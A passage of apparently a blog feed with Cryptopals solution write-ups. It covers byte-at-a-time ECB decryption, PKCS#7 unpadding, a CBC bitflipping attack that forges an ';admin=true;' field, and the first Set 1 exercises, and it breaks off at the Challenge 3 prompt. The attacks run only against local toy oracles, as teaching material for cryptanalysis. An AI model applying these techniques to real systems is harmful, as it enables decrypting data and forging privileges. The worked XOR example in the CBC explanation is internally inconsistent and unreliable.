<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">break_AES_ECB_harder</span>(keysize: int, encryptor: callable) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Breaks AES ECB encryption for the encryptor function provided.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
        
    <span style="color:#75715e"># Find the prefix length.</span>
    padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    random_blocks <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    cipher_length <span style="color:#f92672">=</span> len(encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>))
    prefix_length <span style="color:#f92672">=</span> len(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>commonprefix([encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AAAA&#39;</span>), encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)]))
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Prefix length: &#34;</span>, prefix_length)
    
    <span style="color:#75715e"># Find number of random blocks.</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(int(cipher_length<span style="color:#f92672">/</span>keysize)):
        <span style="color:#66d9ef">if</span> prefix_length <span style="color:#f92672">&lt;</span> i<span style="color:#f92672">*</span>keysize:
            random_blocks <span style="color:#f92672">=</span> i
            <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Random blocks: &#34;</span>, random_blocks)
    
    <span style="color:#75715e"># Find number of byte padding required.</span>
    base_cipher <span style="color:#f92672">=</span> encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, keysize):
        new_cipher <span style="color:#f92672">=</span> encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>i)
        new_prefix_length <span style="color:#f92672">=</span> len(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>commonprefix([base_cipher, new_cipher]))
        <span style="color:#66d9ef">if</span> new_prefix_length <span style="color:#f92672">&gt;</span> prefix_length:
            padding <span style="color:#f92672">=</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
            <span style="color:#66d9ef">break</span>
        base_cipher <span style="color:#f92672">=</span> new_cipher
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Number of bytes of padding required: &#34;</span>, padding)
    
    <span style="color:#75715e"># To get added string length since 0 len input is provided, all cipher is of added string.</span>
    deciphered <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    ciphertext <span style="color:#f92672">=</span> encryptor(deciphered)
    <span style="color:#75715e"># Because of one block increase due to addition of padding.</span>
    run <span style="color:#f92672">=</span> len(ciphertext) <span style="color:#f92672">+</span> keysize
    
    <span style="color:#75715e"># Should start after prefix random_blocks because till then it value will be same for original cipher and templated cipehr since same prepended string will be compared.</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(keysize <span style="color:#f92672">*</span> random_blocks <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, run<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
        template <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(run <span style="color:#f92672">-</span> i <span style="color:#f92672">+</span> padding)
        cipher <span style="color:#f92672">=</span> encryptor(template)
        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
            <span style="color:#75715e">#print(i, j)</span>
            text <span style="color:#f92672">=</span> template <span style="color:#f92672">+</span> deciphered <span style="color:#f92672">+</span> j<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;little&#34;</span>)
            c <span style="color:#f92672">=</span> encryptor(text)
            <span style="color:#75715e"># Keysize used to refer to the block whose last character is made to be the appended string&#39;s 1st char.</span>
            <span style="color:#66d9ef">if</span> c[run<span style="color:#f92672">-</span>keysize:run] <span style="color:#f92672">==</span> cipher[run<span style="color:#f92672">-</span>keysize:run]:
                deciphered <span style="color:#f92672">+=</span> chr(j)<span style="color:#f92672">.</span>encode()
                <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">return</span> PKCS7_unpad(deciphered)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keysize <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
byte_text <span style="color:#f92672">=</span> break_AES_ECB_harder(keysize, AES128_harder)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Deciphered string:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
<span style="color:#66d9ef">print</span>(byte_text<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)<span style="color:#f92672">.</span>strip())
</code></pre></div><p>Prefix length:  176
Random blocks:  12
Number of bytes of padding required:  4
Deciphered string:</p>
<p>Rollin&rsquo; in my 5.0</p>
<p>With my rag-top down so my hair can blow</p>
<p>The girlies on standby waving just to say hi</p>
<p>Did you stop? No, I just drove by</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">test(True)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-15-pkcs7-padding-validation">Challenge 15: PKCS#7 padding validation</h3>
<p><a href="https://cryptopals.com/sets/2/challenges/15">Link</a></p>
<blockquote>
<p>Write a function that takes a plaintext, determines if it has valid PKCS#7 padding, and strips the padding off.<br>
The string:<br>
<strong>&ldquo;ICE ICE BABY\x04\x04\x04\x04&rdquo;</strong><br>
&hellip; has valid padding, and produces the result &ldquo;ICE ICE BABY&rdquo;.<br>
The string:<br>
<strong>&ldquo;ICE ICE BABY\x05\x05\x05\x05&rdquo;</strong><br>
&hellip; does not have valid padding, nor does:<br>
<strong>&ldquo;ICE ICE BABY\x01\x02\x03\x04&rdquo;</strong><br>
If you are writing in a language with exceptions, like Python or Ruby, make your function throw an exception on bad padding.<br>
Crypto nerds know where we&rsquo;re going with this. Bear with us.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
given_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ICE ICE BABY</span><span style="color:#ae81ff">\x04\x04\x04\x04</span><span style="color:#e6db74">&#34;</span>
target_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ICE ICE BABY&#34;</span>
</code></pre></div><p>We can use our good old PKCS7_unpad function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">test(target_string<span style="color:#f92672">.</span>encode() <span style="color:#f92672">==</span> PKCS7_unpad(given_string<span style="color:#f92672">.</span>encode()))
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-16-cbc-bitflipping-attacks">Challenge 16: CBC bitflipping attacks</h3>
<p><a href="https://cryptopals.com/sets/2/challenges/16">Link</a></p>
<blockquote>
<p>Generate a random AES key.<br>
Combine your padding code and CBC code to write two functions.<br>
The first function should take an arbitrary input string, prepend the string:<br>
<strong>&ldquo;comment1=cooking%20MCs;userdata=&rdquo;</strong><br>
.. and append the string:<br>
<strong>&quot;;comment2=%20like%20a%20pound%20of%20bacon&rdquo;</strong><br>
The function should quote out the &ldquo;;&rdquo; and &ldquo;=&rdquo; characters.<br>
The function should then pad out the input to the 16-byte AES block length and encrypt it under the random AES key.<br>
The second function should decrypt the string and look for the characters &ldquo;;admin=true;&rdquo; (or, equivalently, decrypt, split the string on &ldquo;;&rdquo;, convert each resulting string into 2-tuples, and look for the &ldquo;admin&rdquo; tuple).<br>
Return true or false based on whether the string exists.<br>
If you&rsquo;ve written the first function properly, it should not be possible to provide user input to it that will generate the string the second function is looking for. We&rsquo;ll have to break the crypto to do that.<br>
Instead, modify the ciphertext (without knowledge of the AES key) to accomplish this.<br>
You&rsquo;re relying on the fact that in CBC mode, a 1-bit error in a ciphertext block:</p>
</blockquote>
<ul>
<li>Completely scrambles the block the error occurs in.</li>
<li>Produces the identical 1-bit error(/edit) in the next ciphertext block.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> random
<span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
prepend_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;comment1=cooking%20MCs;userdata=&#34;</span>
append_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;;comment2=</span><span style="color:#e6db74">%20li</span><span style="color:#e6db74">ke%20a%20pound</span><span style="color:#e6db74">%20o</span><span style="color:#e6db74">f%20bacon&#34;</span>
parameter <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;;admin=true;&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keysize <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(keysize)
IV <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">255</span>))
</code></pre></div><p>The first function:</p>
<ul>
<li>Appends the string.</li>
<li>Quotes out the specified characters.</li>
<li>Pads the input and encrypts it with AES CBC.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encryptor</span>(text: bytes, IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Prepend and append the given strings to custom text, and encrypt via AES CBC Mode.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    plaintext <span style="color:#f92672">=</span>  (prepend_string<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> text <span style="color:#f92672">+</span> append_string<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#34;;&#34;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#34;=&#34;&#39;</span>)
    ciphertext <span style="color:#f92672">=</span> AES_CBC_encrypt(PKCS7_pad(plaintext, len(key)), IV, key)
    <span style="color:#66d9ef">return</span> ciphertext
</code></pre></div><p>The second function:</p>
<ul>
<li>Decrypts the input.</li>
<li>Returns true or false based on presence of &ldquo;;admin=true;&rdquo; in the decrypted string.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decryptor</span>(byte_string: bytes, IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Decrypt the given ciphertext via AES CBC Mode and check if admin is set to true.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    decrypted_string <span style="color:#f92672">=</span> PKCS7_unpad(AES_CBC_decrypt(byte_string, IV, key))
    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;;admin=true;&#34;</span> <span style="color:#f92672">in</span> decrypted_string:
        <span style="color:#66d9ef">return</span> True
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> False
</code></pre></div><p>During AES CBC Mode decryption process, decryption of ith block involves xoring it with (i-1)th block.<br>
The trick here is the fact that the change you make to the bit of (i-1)th block, is the exact same change that&rsquo;s going to be reflected in the decrypyted text of ith block. This is because both the blocks are being xored together.</p>
<p>The thing to note here is that flipping the bit of (i-1)th block is going to completely distort the decrypted text of (i-1)th block. But this is not an issue since we are focusing on the decryption of ith block.</p>
<p>We therefore modify the bits of (i-1)th block by xoring it together with the given string so as to produce values, that when xored with ith block, give out this string.</p>
<p>For example,<br>
let:     <br>
ciphertext_block_1 = “xxxx”     <br>
ciphertext_block_2 = “efgh”     <br>
=&gt; plaintext_block_2 = AES_ECB_decrypt(&ldquo;abcd&rdquo;) ⊕ “xxxx”</p>
<p>If we change ciphertext_block_1 to “xxbx”, plaintext_block_2 becomes AES_ECB_decrypt(&ldquo;abcd&rdquo;) ⊕ “xxbx”, i.e only the 3rd position changes.</p>
<p>Assume plaintext_block_2 = “cats”. Now, if we want to change it to &ldquo;cots&rdquo;, we need to find a byte “y” such that we can change ciphertext_block_1 to “xyxx” and get “cots” as plaintext_block_2.</p>
<p>AES_ECB_decrypt(&ldquo;efgh&rdquo;) ⊕ “xxxx” = “cats”
AES_ECB_decrypt(&ldquo;efgh&rdquo;) ⊕ “xyxx” = “cots”</p>
<p>Let’s say f∗ is the AES ECB decrypted “f”. Also, the inverse of XOR is XOR.</p>
<pre><code>f∗⊕x=“i”    
f∗=x⊕“i”    
f∗⊕y=“o”    
y=f∗⊕“a”=x⊕“i”⊕“a”
</code></pre>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">CBC_bit_flipping</span>(parameter: bytes, keysize: int, encryptor: callable) <span style="color:#f92672">-&gt;</span> bytes:    
    
    <span style="color:#75715e"># Padding required to bridge gap between randomstringlength and block.</span>
    padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    random_blocks <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>


    <span style="color:#75715e"># Find the prefix length.</span>
    cipher_length <span style="color:#f92672">=</span> len(encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>, IV, random_key))
    prefix_length <span style="color:#f92672">=</span> len(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>commonprefix([encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AAAA&#39;</span>, IV, random_key), encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>, IV, random_key)]))
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Prefix length: &#34;</span>, prefix_length)

    <span style="color:#75715e"># Find number of random blocks.</span>
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(int(cipher_length<span style="color:#f92672">/</span>keysize)):
        <span style="color:#66d9ef">if</span> prefix_length <span style="color:#f92672">&lt;</span> i<span style="color:#f92672">*</span>keysize:
            random_blocks <span style="color:#f92672">=</span> i
            <span style="color:#66d9ef">break</span>
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Random blocks: &#34;</span>, random_blocks)

    <span style="color:#75715e"># Find number of byte padding required.</span>
    base_cipher <span style="color:#f92672">=</span> encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>, IV, random_key)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, keysize):
        new_cipher <span style="color:#f92672">=</span> encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>i, IV, random_key)
        new_prefix_length <span style="color:#f92672">=</span> len(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>commonprefix([base_cipher, new_cipher]))
        <span style="color:#66d9ef">if</span> new_prefix_length <span style="color:#f92672">&gt;</span> prefix_length:
            padding <span style="color:#f92672">=</span> i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>
            <span style="color:#66d9ef">break</span>
        base_cipher <span style="color:#f92672">=</span> new_cipher
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Number of bytes of padding required: &#34;</span>, padding)

    <span style="color:#75715e"># Flip bytes for the given string.</span>
    input_text <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>padding <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;heytheremama&#34;</span>
    string <span style="color:#f92672">=</span> parameter
    modified_string <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    ciphertext <span style="color:#f92672">=</span> encryptor(input_text, IV, random_key)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(string)):
        modified_string <span style="color:#f92672">+=</span> (ciphertext[i<span style="color:#f92672">+</span>(random_blocks<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>keysize]<span style="color:#f92672">^</span>(input_text[i<span style="color:#f92672">+</span>padding]<span style="color:#f92672">^</span>string[i]))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>)

    modified_ciphertext <span style="color:#f92672">=</span> ciphertext[:(random_blocks<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>keysize] <span style="color:#f92672">+</span> modified_string <span style="color:#f92672">+</span> ciphertext[(random_blocks<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>keysize <span style="color:#f92672">+</span> len(modified_string):]
    
    <span style="color:#66d9ef">return</span> modified_ciphertext
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">modified_ciphertext <span style="color:#f92672">=</span> CBC_bit_flipping(parameter, keysize, encryptor)
AES_CBC_decrypt(modified_ciphertext, IV, random_key)
</code></pre></div><p>Prefix length:  32
Random blocks:  3
Number of bytes of padding required:  7</p>
<p>b&rsquo;comment1&quot;=&quot;cooking%20MCs&rdquo;;&ldquo;userd\t\xc2\xaf\xc3\x8c\xc2\x8a\xc3\xa6\xc3\x9e\xc2\x94\xc3\x989;\xc2\x97\xc3\xa3\xc2\xb1s#\xc2\x94;admin=true;&quot;;&ldquo;comment2&quot;=&rdquo;%20like%20a%20pound%20of%20bacon\x06\x06\x06\x06\x06\x06&rsquo;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">test(decryptor(modified_ciphertext, IV, random_key) <span style="color:#f92672">==</span> True)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


]]></content>
        </item>
        
        <item>
            <title>Set 1</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/20/set-1/</link>
            <pubDate>Fri, 20 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/20/set-1/</guid>
            <description>Refer to this repository for solution scripts and the IPython Notebook pertaining to the explanations here.
Challenge 1: Convert hex to base64 Link
 The string:
49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f697 36f6e6f7573206d757368726f6f6d
Should produce:
SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t
So go ahead and make that happen.
You&amp;rsquo;ll need to use this code for the rest of the exercises.
 Data, essentially raw bytes/binary (0, 1), can be represented in various forms and formats as required. These representations may be used for simply the presentation of data, or may be required by some protocol so as to prevent misinterpretation of data.</description>
            <content type="html"><![CDATA[<p>Refer to this <a href="https://github.com/hexterisk/cryptopals-solutions">repository</a> for solution scripts and the IPython Notebook pertaining to the explanations here.</p>
<h3 id="challenge-1-convert-hex-to-base64">Challenge 1: Convert hex to base64</h3>
<p><a href="https://cryptopals.com/sets/1/challenges/1">Link</a></p>
<blockquote>
<p>The string:<br>
<strong>49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f697</strong>  <strong>36f6e6f7573206d757368726f6f6d</strong><br>
Should produce:<br>
<strong>SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t</strong><br>
So go ahead and make that happen.<br>
You&rsquo;ll need to use this code for the rest of the exercises.</p>
</blockquote>
<p>Data, essentially raw bytes/binary (0, 1), can be represented in various forms and formats as required. These representations may be used for simply the presentation of data, or may be required by some protocol so as to prevent misinterpretation of data.</p>
<h6 id="hex">Hex</h6>
<p>Hexadecimal is a representation format where the base for the numbers is 16. This implies that our notation consists of 16 digits (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, a, b, c, d, e and f), instead of the usual 10 that we use in our base 10 system.</p>
<p>It is preferable over the standard binary that computers store at the low level because:</p>
<ul>
<li>Readability: Hexadecimal in it&rsquo;s set uses digits that overlap with the common base-10 counting system and therefore it&rsquo;s easier to read and write.</li>
<li>Higher information density: Any number between 0 and 255 can be represented using 2 hex digits, while binary would require 8 digits for the same. This poses a problem as numbers start to get bigger.</li>
</ul>
<p><img src="/Cryptopals_Set_1/4_image.png" alt="&ldquo;representations&rdquo;">
<em>Each purple tick is when a new digit is added when representing numbers.</em></p>
<p>It is preferable over the standard decimal representation that we generally use because binary and decimal never align. However, binary and hex do in fact align every 4 binary digits. This implies that a hexadecimal digit can be represented by 4 binary digits. The main reason for this is the fact that binary is a base 2 system, and therefore is compatible with any system with the specification 2ⁿ (hex is 2⁴).</p>
<h5 id="base64">Base64</h5>
<p>An encoding scheme generally used when data needs to be transferred or stored, devised to support MIME (specifically embedding media assets inside textual assets such as HTML). Each base64 digit represents 6-bit of data, therefore a 24-bit data is represented by 4 base64 digits. Binary aligns with base64 since it is of the form 2ⁿ (base64 is 2⁶).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode

<span style="color:#75715e"># Given</span>
hex_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d&#34;</span>
target_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t&#34;</span>
</code></pre></div><p>Convert given hex string to bytes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">byte_string <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(hex_string)
</code></pre></div><p>Convert this byte string to a base64 encoded string.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">base64_byte_string <span style="color:#f92672">=</span> b64encode(byte_string)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-2-fixed-xor">Challenge 2: Fixed XOR</h3>
<p><a href="https://cryptopals.com/sets/1/challenges/2">Link</a></p>
<blockquote>
<p>Write a function that takes two equal-length buffers and produces their XOR combination.<br>
If your function works properly, then when you feed it the string:<br>
<strong>1c0111001f010100061a024b53535009181c</strong><br>
&hellip; after hex decoding, and when XOR&rsquo;d against:<br>
<strong>686974207468652062756c6c277320657965</strong><br>
&hellip; should produce:<br>
<strong>746865206b696420646f6e277420706c6179</strong></p>
</blockquote>
<p><img src="/Cryptopals_Set_1/5_image.png" alt="&ldquo;xor&rdquo;">
<em>The functionality is as the name suggests, ‘exclusive OR’: A ⊕ B returns true if and only if exactly one of A and B is true.</em></p>
<p>This could also be said to be telling the difference between the two:<br>
A ⊕ B = ‘where the bits differ’. This clearly implies that A ⊕ A = 0 (byte A does not differ from itself in any bit), and,<br>
A ⊕ 0 = A (byte A differs from 0 precisely in the bit positions that equal 1) and is also useful when thinking about toggling and encryption later on.</p>
<p>In cryptography, the simple XOR cipher is a type of additive cipher, an encryption algorithm that operates according to the following properties:</p>
<ul>
<li>Commutative: A ⊕ B = B ⊕ A</li>
<li>Associative: A ⊕ ( B ⊕ C ) = ( A ⊕ B ) ⊕ C</li>
<li>Identity element: A ⊕ 0 = A</li>
<li>Self-inverse: A ⊕ A = 0</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64encode
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
hex_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1c0111001f010100061a024b53535009181c&#34;</span>
key_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;686974207468652062756c6c277320657965&#34;</span>
target_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;746865206b696420646f6e277420706c6179&#34;</span>
</code></pre></div><p>Function to calculate the xor of two byte strings.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_bytes</span>(enc1: bytes, enc2: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    xor_bytes computes the xor of two byte strings and returns the final value.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([bytes(b1<span style="color:#f92672">^</span>b2 <span style="color:#66d9ef">for</span> b1, b2 <span style="color:#f92672">in</span> zip(enc1, enc2))])
    <span style="color:#66d9ef">return</span> cipher
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">byte_string <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(hex_string)
key_byte_string <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(key_string)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">result <span style="color:#f92672">=</span> xor_bytes(byte_string, key_byte_string)<span style="color:#f92672">.</span>hex()
</code></pre></div><p>Verify the solution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">assert</span> result <span style="color:#f92672">==</span> target_string
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-3-single-byte-xor-cipher">Challenge 3: Single-byte XOR cipher</h3>
<p><a href="https://cryptopals.com/sets/1/challenges/3">Link</a></p>
<blockquote>
<p>The hex encoded string:<br>
<strong>1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736</strong><br>
&hellip; has been XOR&rsquo;d against a single character. Find the key, decrypt the message.<br>
You can do this by hand. But don&rsquo;t: write code to do it for you. How? Devise some method for &ldquo;scoring&rdquo; a piece of English plaintext. Character frequency is a good metric. Evaluate each output and choose the one with the best score.</p>
</blockquote>
